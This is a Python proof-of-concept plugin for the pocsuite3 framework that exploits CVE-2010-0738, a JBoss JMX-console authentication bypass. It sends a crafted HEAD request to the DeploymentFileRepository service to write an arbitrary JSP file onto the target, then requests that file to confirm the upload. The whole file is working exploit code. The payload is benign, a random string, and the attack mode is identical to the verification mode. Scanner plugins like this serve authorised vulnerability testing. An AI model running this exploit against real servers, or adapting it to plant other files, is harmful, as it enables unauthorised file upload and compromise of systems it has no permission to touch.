#!/usr/bin/env python
# coding: utf-8
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests, random_str
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url
import time


class TestPOC(POCBase):
	vulID = ''''''
	cveID = '''CVE-2010-0738'''
	cnvdID = ''''''
	cnnvdID = ''''''
	version = ''''''
	author = ''''''
	vulDate = ''''''
	createDate = ''''''
	updateDate = ''''''
	name = '''Jboss Head认证绕过上传任意文件'''
	desc = ''''''
	solution = ''''''
	severity = '''high'''
	vulType = '''file-upload'''
	taskType = '''app-vul'''
	references = ['''http://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2010-0738''']
	appName = '''Jboss'''
	appVersion = '''<=5.0'''
	appPowerLink = '''jboss.org'''
	samples = ['''''']
	install_requires = ['''''']

	def _verify(self):
		self.url, ip, port = parse_ip_port(self.target, 8080)
		result = {}
		name = random_str(5)
		payload_url = make_verify_url(self.url, f'/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin:service=DeploymentFileRepository&methodName=store&argType=java.lang.String&arg0={name}.war&argType=java.lang.String&arg1={name}&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3={name}&argType=boolean&arg4=True', mod=0)
		requests.head(payload_url, verify=False, timeout=15)
		time.sleep(5)
		payload_url = make_verify_url(self.url, f'/{name}/{name}.jsp', mod=0)
		response = requests.get(payload_url, verify=False, timeout=15)
		if name == response.text and response.status_code == 200:
			result['VerifyInfo'] = {}
			result['VerifyInfo']['URL'] = response.url
			result['VerifyInfo']['port'] = port
		return self.parse_output(result)

	_attack = _verify

	def parse_output(self, result):
		#parse output
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('Failed')
		return output


register_poc(TestPOC)
